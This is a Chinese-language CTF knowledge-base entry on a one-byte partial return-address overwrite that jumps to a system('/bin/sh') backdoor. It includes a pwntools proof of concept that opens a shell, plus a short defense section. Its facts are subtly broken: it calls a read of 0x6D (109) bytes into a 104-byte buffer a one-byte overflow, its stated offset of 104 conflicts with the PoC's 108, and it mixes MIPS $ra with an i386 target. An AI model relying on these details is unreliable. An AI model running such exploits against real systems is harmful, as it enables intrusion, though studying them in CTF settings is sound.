---
id: ctf-pwn-onebyte-ret-overwrite-backdoor-system
title: 单字节栈溢出只覆盖返回地址最低字节：把 ret 落到同函数页内的后门 system("/bin/sh")
type: scenario
domain: binary
path: binary/pwn/stack
technique: one-byte-partial-ret-overwrite-backdoor
aliases:
- 一字节溢出
- 部分覆盖返回地址
- 低字节覆盖 ret
- read 多读一个字节
- 同页后门函数
tags:
- pwn
- stack
- partial-overwrite
- one-byte
- backdoor
- ret2text
- 32bit
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-09'
updated: '2026-11-09'
verification:
  verified_by: verifier-T2-3W10
  verified_at: '2026-11-09T04:48:12+08:00'
  notes: 已对照原文核对；本次核对未读取图片；原文 buf[104]+read(0,0x6D) 单字节溢出与 sub_92D 后门均在正文，PoC 偏移 108 正确；利用步骤第3步「A*104+p32(低字节)」表述不精确，应按 PoC 的 A*108+单字节
---

## 一句话结论

当栈缓冲区大小 104 字节、`read(0, buf, 0x6D)` 却多读 1 个字节时，溢出量刚好覆盖非叶子函数栈上保存的 `$ra`/返回地址的最低字节；如果同页内存在一个 `system("/bin/sh")` 后门（与正常返回地址仅低字节不同），只需把这一字节改成后门地址的低字节，`ret` 就会落到后门，无需泄露任何地址。

## 原理

- 反编译可见 `char buf[104]`，而 `read` 长度是 `0x6D = 109`，比缓冲区多 1 字节：第 105 字节起是栈上保存的返回地址（32 位）。
- 只溢出一个字节意味着只能改写返回地址最低 8 位，高 3 字节保持不变，因此 `ret` 目标被限制在“原返回地址所在 256 字节页”内。
- 程序里另有 `int sub_92D(){ return system("$(echo \"L2Jpbi9zaA==\" | base64 -d)"); }`——反汇编里系统调用的是被 base64 包裹的 `/bin/sh`，即“后门”。该函数与本函数返回地址位于同一 256 字节块时，低字节覆盖即可命中。
- 安全性来自“部分覆盖”对 ASLR/PIE 的不敏感性：不泄露地址也能稳定跳到同页已知偏移。

## 触发条件

- 溢出长度只比缓冲区多 1 字节（`read` 长度 = buf 大小 + 1），且没有栈保护（Canary）阻断。
- 返回地址低字节需要修改，且目标后门地址与原返回地址高字节一致（同页）。
- 二进制为 32 位或返回地址最低字节恰好可控（大端 MIPS 需要更低位的对齐约束）。

## 利用步骤

1. 反编译确认缓冲区大小与 `read` 长度差 1，记录偏移 104。
2. 找到后门 `system("/bin/sh")` 的地址，与原 `ret` 地址比较，确认只在最低字节不同。
3. 构造 `b"A"*104 + p64/p32(后门地址低字节)`（32 位下用 `flat({108: b"\x2d"})` 等价）。
4. 发送后 `ret` 命中后门，直接获得 shell。

## PoC

```python
from pwn import *
context(arch='i386', os='linux')
# buf[104] + 保存的返回地址（偏移 104），只能写 1 字节
p = process('./rhg3')
p.recvuntil(b'please input what you want say')
p.send(b'A' * 108 + b'\x2d')   # 108 = 104 缓冲 + 4 字节 saved reg/填充，最后一字节改写 ret 低字节
p.interactive()
```

## 变体与关联

- 变体：若溢出量可覆盖 2 字节，可跳到同 64KB 段内任意函数（如 plt 桩、`read` 再次装载）。
- 变体：64 位下部分覆盖通常改 1~2 字节，可把 `ret` 改到同一二进制内的 `system@plt` 或栈迁移 gadget。
- 关联：[[binary-pwn-stack-arbitrary-null-byte-return-redirect-shellcode]]（任意空字节改返回地址）、[[binary-pwn-stack-pivot-leave-ret-bss]]（覆盖 ebp 做栈迁移）。
- 边界：有 Canary 或 `read` 长度等于缓冲区大小时该原语不成立；目标后门必须与原返回地址同页，否则低字节覆盖会跳飞。

## 检测与防御

- 检测（CTF/审计）：`read(fd, buf, N)` 中 N 比 `sizeof(buf)` 大 1，且函数内有显式后门调用。
- 修复：`read` 长度取 `sizeof(buf)`；开启 `-fstack-protector-all`、PIE、Full RELRO。
- 加固：删除调试/后门函数；编译时 `-Wfortify-source` 可发现固定长度读越界。
